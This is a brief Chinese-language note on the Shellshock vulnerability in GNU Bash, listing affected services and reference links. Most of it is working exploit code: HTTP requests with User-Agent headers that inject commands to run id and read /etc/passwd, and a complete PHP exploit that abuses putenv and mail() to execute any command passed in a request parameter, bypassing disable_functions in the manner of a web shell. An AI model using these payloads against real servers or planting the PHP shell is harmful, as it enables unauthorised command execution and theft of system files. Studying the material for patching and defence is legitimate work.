# 破壳漏洞
![](/images/破壳漏洞影响范围.png)
GNU Bash <= 4.3，此漏洞可能会影响到使用ForceCommand功能的OpenSSH sshd、使用mod_cgi或mod_cgid的Apache服务器、DHCP客户端、其他使用Bash作为解释器的应用等。

[web服务器和CGI的关系](https://blog.csdn.net/kobejayandy/article/details/11906505)

#### 参考

- https://www.cnblogs.com/qmfsun/p/7591757.html
- https://github.com/vulhub/vulhub/tree/master/bash/shellshock

![](491580-20170926162151276-378081397.png)

#### poc

```http
GET /victim.cgi HTTP/1.1
Host: 127.0.0.1:1235
User-Agent: () { foo; }; echo Content-Type: text/plain; echo; /usr/bin/id
```
```
User-Agent: () { :;};a=`/bin/cat /etc/passwd`;echo "a: $a"
User-Agent: () { :;}; echo `/bin/cat /etc/passwd`
```

## php mail相关函数可利用此漏洞

#### poc

```php
<?php 
# Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) 
# Google Dork: none 
# Date: 10/31/2014 
# Exploit Author: Ryan King (Starfall) 
# Vendor Homepage: http://php.net 
# Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror 
# Version: 5.* (tested on 5.6.2) 
# Tested on: Debian 7 and CentOS 5 and 6 
# CVE: CVE-2014-6271 

function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail.c:283 
   $tmp = tempnam(".","data"); 
   putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1"); 
   // In Safe Mode, the user may only alter environment variableswhose names 
   // begin with the prefixes supplied by this directive. 
   // By default, users will only be able to set environment variablesthat 
   // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, 
   // PHP will let the user modify ANY environment variable! 
   mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actuallysend any mail 
   $output = @file_get_contents($tmp); 
   @unlink($tmp); 
   if($output != "") return $output; 
   else return "No output, or not vuln."; 
} 
echo shellshock($_REQUEST["cmd"]); 
?>
```

imap_mail函数同样也可以